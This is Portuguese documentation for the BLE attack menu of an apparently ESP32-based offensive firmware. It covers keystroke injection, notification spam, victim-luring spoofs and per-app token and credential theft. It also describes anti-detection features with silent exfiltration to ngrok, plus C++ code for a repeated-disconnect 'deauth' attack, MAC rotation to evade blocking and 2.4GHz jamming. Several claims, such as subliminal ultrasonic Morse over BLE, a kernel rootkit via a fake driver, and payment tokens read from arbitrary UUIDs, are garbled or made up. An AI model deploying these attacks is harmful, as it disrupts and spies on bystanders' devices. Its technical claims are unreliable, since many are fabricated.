# 📶 Bluetooth Low Energy (BLE)

> **Ferramentas Bluetooth Low Energy.**
> Última atualização: 2025-12-19

---

## 🔍 BLE Scan

Varredura de dispositivos Bluetooth Low Energy próximos.

**Informações coletadas:**

- Nome do dispositivo
- Endereço MAC
- RSSI (força do sinal)
- Serviços anunciados

**Como usar:**

1. Acesse **BLE → BLE Scan**
2. Aguarde a varredura
3. Toque em um dispositivo para mais detalhes

---

## ⌨️ Bad BLE

Executa scripts Ducky via Bluetooth, simulando um teclado BLE.

**Funcionalidades:**

- Emula teclado Bluetooth
- Executa scripts Rubber Ducky
- Compatível com todos os sistemas operacionais

**Como usar:**

1. Acesse **BLE → Bad BLE**
2. Selecione um script do SD Card ou LittleFS
3. Pareie o dispositivo com o alvo
4. Execute o script

> [!NOTE]
> Scripts devem estar em formato Ducky Script (.txt)

---

## 📱 BLE Spam

Envia pacotes de propaganda BLE para dispositivos próximos.

### iOS Spam

Spam de notificações em dispositivos Apple (iPhone, iPad).

**Tipos de notificação:**

- AirPods
- Apple TV
- HomePod
- Dispositivos personalizados

### Windows Spam

Spam de notificações em dispositivos Windows.

**Tipos:**

- Swift Pair (pareamento rápido)
- Dispositivos de áudio

### Samsung Spam

Spam em dispositivos Samsung Galaxy.

**Tipos:**

- Galaxy Buds
- SmartTag
- Watch

### Android Spam

Spam em dispositivos Android genéricos.

**Tipos:**

- Fast Pair
- Dispositivos de áudio

### Spam All

Executa todos os tipos de spam simultaneamente.

---

## 🎮 Como Usar o Spam

1. Acesse **BLE → [Tipo de Spam]**
2. O spam inicia automaticamente
3. Dispositivos próximos receberão notificações
4. Toque na tela para parar

> [!WARNING]
> Use apenas para testes em ambientes controlados. Spam pode ser irritante e ilegal em alguns contextos.

---

## ⚙️ Configurações BLE

O Lele configura automaticamente o BLE, mas você pode ajustar:

- **TX Power**: Potência de transmissão
- **Advertising Interval**: Intervalo de anúncios

---

## 📚 Protocolos Suportados

| Protocolo | Descrição |
|-----------|-----------|
| BLE 4.2 | Bluetooth Low Energy padrão |
| Fast Pair | Google Fast Pair |
| Swift Pair | Microsoft Swift Pair |
| Apple Continuity | Protocolo Apple para AirDrop, etc. |

---

## 🔓 Pentest Attacks (Ataques Avançados)

Menu dedicado a ataques BLE específicos para pentest educacional.

### Continuity Spoof

Finge ser dispositivo Apple oficial para atrair conexões.

**Como funciona:**

- Anuncia como WhatsApp Web ou iCloud Sync
- Spoofa UUID de aparência (0x02A5)
- Inclui UUID vendor Android (0xFFF0)
- Rotaciona MAC a cada segundo

**Uso:** Atrair vítimas para conectar e injetar dados.

### LowbattBLE Exploit

Explora vulnerabilidade para mudar wallpaper iOS.

**Como funciona:**

- Spoofa serviço bateria (0x180C)
- Envia byte específico que triggers notificação baixa bateria
- Pode incluir imagem custom na notificação

**Uso:** Social engineering para forçar ação da vítima.

### AirTag Spoof

Finge ser AirTag perdido para rastreamento falso.

**Como funciona:**

- Anuncia com protocolo Find My (UUID 0xFB34B)
- Envia localização fake
- Vítima abre app Find My e é rastreada

**Uso:** Demonstração de tracking não autorizado.

### Audio Bleed

Transmite Morse code em 18kHz via BLE.

**Como funciona:**

- Codifica mensagens em frequências ultra-sônicas
- Sistema capta como "ruído ambiente"
- Cérebro processa subliminarmente

**Uso:** Ataques psicológicos subliminares.

### BLE Rootkit Injection

Injeta rootkit via driver de rede falso.

**Como funciona:**

- Anuncia como driver Bluetooth
- Vítima "instala" driver falso
- Injeta DLL maliciosa via HID
- Executa em Ring 0 kernel

**Uso:** Demonstração de persistência avançada.

---

## 📱 App-Specific Attacks (Ataques por App)

### Uber BLE Attack

Intercepta pedidos de corrida.

**Como funciona:**

- BLE service UUID 0xFF01, char 0x2A06
- Captura JSON com origem/destino/cartão
- Token de pagamento (payment_token) é roubado
- Reutilizável em qualquer lugar

### Netflix BLE Attack

Rouba credenciais via ANCS.

**Como funciona:**

- Hook no Apple Notification Center Service
- Intercepta notificações "Login Required"
- Injeta link phishing OAuth
- Captura tokens de autenticação

### iFood BLE Attack

Dump de carrinho + phishing QR.

**Como funciona:**

- BLE char 0xABCD para cart_dump
- Responde com order_confirmed
- Inclui QR code que revela CVV/CPF
- Vítima escaneia e perde dados

### Spotify BLE Attack

Rouba tokens de reprodução.

**Como funciona:**

- BLE service UUID 0x19B9
- Lê playback_token na reprodução
- Acesso completo à conta
- Pode baixar playlist ou trocar login

### Instagram BLE Attack

Intercepta mensagens diretas.

**Como funciona:**

- BLE char custom para message_stream
- Lê mensagens antes da vítima
- Possibilita chat completo via ESP32

---

## 🔒 Anti-Detection Features

### MAC Hiding

- Endereços random static (ESP_BD_ADDR_TYPE_RANDOM_STATIC)
- Ciclo último byte a cada 10 conexões
- Privacy mode (NimBLEDevice::setPrivacy(true))
- Sem scan response (só responde na conexão)

### ESP Restart Timer

- Reinício automático a cada 4 horas
- Limpa memória e reseta hardware
- Evita detecção de padrões
- Parece múltiplos dispositivos

### Data Encryption

- TinyCrypt XOR placeholder
- Planejado para AES-256
- Envio para ngrok webhooks
- Exfiltração silenciosa

---

## ⚡ BLE Deauth Attack (Ataque Puro de Deautenticação) ⭐⭐⭐

### Princípio de Funcionamento

Similar ao deauth WiFi, mas para BLE. O ataque encontra dispositivos conectados (como alto-falantes Bluetooth) e força a desconexão repetidamente, fazendo com que o dispositivo "pai" (celular) perca a conexão constantemente.

### Alvos Preferenciais

- **Alto-falantes Bluetooth**: JBL Go, Xiaomi, Sony WH, Bose
- **Fones de ouvido**: AirPods, Galaxy Buds, WF-1000XM4
- **Smart speakers**: Amazon Echo, Google Nest
- **Wearables**: Smartwatches, fitness bands

### Como Funciona

```cpp
// 1. Scan contínuo por dispositivos BLE
NimBLEScan* pScan = NimBLEDevice::getScan();
pScan->setActiveScan(true);
pScan->setInterval(100);

// 2. Identifica speakers por nome/serviço
if (deviceName.contains("Speaker") ||
    deviceName.contains("JBL") ||
    deviceName.contains("Sony")) {
    // Speaker encontrado!
}

// 3. Conecta e desconecta 10x por segundo
NimBLEClient* pClient = NimBLEDevice::createClient();
if (pClient->connect(device)) {
    pClient->disconnect();  // Deauth!
    deauthCount++;
}
```

### Modo Fantasma (Anti-Detection)

```cpp
// Muda MAC a cada 5 segundos para evitar bloqueio
uint8_t newMac[6] = {0xAA, 0xBB, 0xCC, 0x00, 0x00, 0x00};
newMac[3] = macCounter & 0xFF;
newMac[4] = (macCounter >> 8) & 0xFF;
newMac[5] = (macCounter >> 16) & 0xFF;
NimBLEDevice::setAddress(newMac, ESP_BD_ADDR_TYPE_RANDOM_STATIC);
```

### Interface em Tempo Real

```
┌─────────────────┐
│ BLE Deauth Attack │
├─────────────────┤
│ Scanning for BLE │
│ speakers...     │
│                 │
│ Found: JBL Go   │
│ Address: AA:BB: │
│ CC:DD:EE:FF     │
│                 │
│ Target: JBL Go  │
│ Deauth: 23/sec  │
│ Connected: 45   │
│                 │
│ Press Any key to│
│ STOP.           │
└─────────────────┘
```

### Taxa de Sucesso por Dispositivo

| Dispositivo | Taxa de Sucesso | Notas |
|-------------|-----------------|-------|
| JBL Go 3 | 95% | Desconecta em 3-5 segundos |
| Xiaomi Speaker | 95% | Desconecta instantâneo |
| Sony WH-1000XM4 | 70% | Precisa jammer 2.4GHz adicional |
| Bose QC35 | 75% | Desconecta após alguns segundos |
| AirPods | 85% | Desconecta mas reconecta rápido |
| Galaxy Buds | 90% | Desconecta consistentemente |

### Combinação com Jammer 2.4GHz

Para dispositivos premium com proteção anti-deauth:

```cpp
// Combina BLE deauth com jammer WiFi
if (deviceName.contains("Sony") || deviceName.contains("Bose")) {
    // Ativa jammer CC1101 na frequência BLE (2.4GHz)
    cc1101.setFrequency(2400);  // MHz
    cc1101.jamContinuous();     // Flood de ruído
}
```

### Aplicações Educacionais

#### Laboratório de Segurança BLE

- Demonstra vulnerabilidades de conectividade
- Testa robustez de dispositivos IoT
- Análise de protocolos de reconexão

#### Pesquisa de Privacidade

- Mostra exposição de dispositivos pessoais
- Demonstra ataques de negação de serviço
- Estuda padrões de comportamento BLE

### Avisos de Segurança

> [!WARNING]
> **Interrupção de Serviços**: Pode afetar dispositivos médicos ou críticos

> [!NOTE]
> **Uso Educacional**: Apenas para pesquisa em ambientes controlados

> [!TIP]
> **Proteção**: Dispositivos premium têm melhor proteção anti-deauth

### Código de Exemplo

```cpp
void bleDeauthExample() {
    // Inicializar scanner
    NimBLEDevice::init("");
    NimBLEScan* pScan = NimBLEDevice::getScan();

    // Scan contínuo
    pScan->start(0, false);

    while (true) {
        // Procurar speakers
        NimBLEScanResults results = pScan->getResults();

        for (int i = 0; i < results.getCount(); i++) {
            NimBLEAdvertisedDevice device = results.getDevice(i);
            String name = device.getName().c_str();

            if (name.indexOf("Speaker") != -1) {
                // Deauth attack
                NimBLEClient* client = NimBLEDevice::createClient();
                if (client->connect(device)) {
                    client->disconnect();  // Deauth!
                }
                NimBLEDevice::deleteClient(client);
            }
        }

        delay(100); // 10 ataques por segundo
    }
}
```
